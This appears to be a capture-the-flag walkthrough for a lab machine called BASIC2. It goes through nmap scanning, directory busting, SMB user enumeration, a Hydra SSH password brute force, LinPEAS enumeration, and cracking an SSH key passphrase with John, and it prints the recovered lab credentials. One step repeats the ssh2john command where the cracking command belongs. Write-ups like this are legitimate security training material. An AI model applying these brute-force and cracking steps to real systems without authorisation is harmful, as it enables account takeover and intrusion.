Steps and Results:

 1.Nmap Scan
     Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 10:35 IST
Nmap scan report for 10.10.168.147
Host is up (0.27s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00                                                                            
|   FQDN: basic2
|_  System time: 2020-09-03T01:06:52-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-03T05:06:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.98 seconds
















 Open Ports:
 22
 80
 139
 445
 8009
 8080



2.Visited port 80 i.e. website and got hint for directory busting


3.Gobuster :
    kali@kali:~$ gobuster dir  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.168.147===============================================================
Gobuster v3.0.1                                                                                         
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                         
===============================================================                                            
[+] Url:            http://10.10.168.147
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/03 10:48:25 Starting gobuster
===============================================================
/development (Status: 301)


4.Hidden directory:
  development





5.For enumarating users :
 
  Command Used : enum4linux -a ip-address 
        


Result:
User Found: 'jan' & 'kay'        


6.Brute Forcing password using Hydra:
  
  Command Used: hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.168.147






Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-03 11:34:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.168.147:22/
[STATUS] 146.00 tries/min, 146 tries in 00:01h, 14344256 to do in 1637:29h, 16 active
[STATUS] 113.00 tries/min, 339 tries in 00:03h, 14344063 to do in 2115:39h, 16 active
[STATUS] 105.57 tries/min, 739 tries in 00:07h, 14343663 to do in 2264:27h, 16 active
[22][ssh] host: 10.10.168.147   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-03 11:42:50




  Result :
  Password Found : "armando"



7.Logged In Using SSH :

   Command Used:ssh jan@ip-address

8. Used LinPEAS for privesc

   File is transferred on remote host using script:
      Command Used : scp linpeas.sh jan@ip-address /dev/shm

   Then executed over there
   A private key is found for user 'kay'


9.Tried to Log In using ssh using private key: 
     
     Command Used : ssh -i kay_rsa_key kay@ip-address 

        kali@kali:~$ sudo ssh -i kay_rsa kay@10.10.168.147
        The authenticity of host '10.10.168.147 (10.10.168.147)' can't be established.
        ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.
        Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
        Warning: Permanently added '10.10.168.147' (ECDSA) to the list of known hosts.
        Enter passphrase for key 'kay_rsa': 
        Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

        * Documentation:  https://help.ubuntu.com
        * Management:     https://landscape.canonical.com
        * Support:        https://ubuntu.com/advantage

        0 packages can be updated.
        0 updates are security updates.




         Problem arised:
         Asked for paraphrase


10. Cracked the hash using JohnTheRipper:
    
     First private key is converted in the format of ssh2john .

     Command Used : /usr/share/john/ssh2john.py kay_rsa >kay.txt
    
     Then hash is cracked.
      
     Command Used : /usr/share/john/ssh2john.py kay_rsa >kay.txt


     Result : 
      Hash found : beeswax 


11. Logged In using SSH 

     Command Used :ssh -i kay_rsa_key kay@ip-address 
      
     Passphrase :beeswax

12. File pass.bak is present 

     Command Used : cat pass.bak

     Result : heresareallystrongpasswordthatfollowsthepasswordpolicy$$





Hurray...........................
Challenge Completed........................................

            
 

       






  


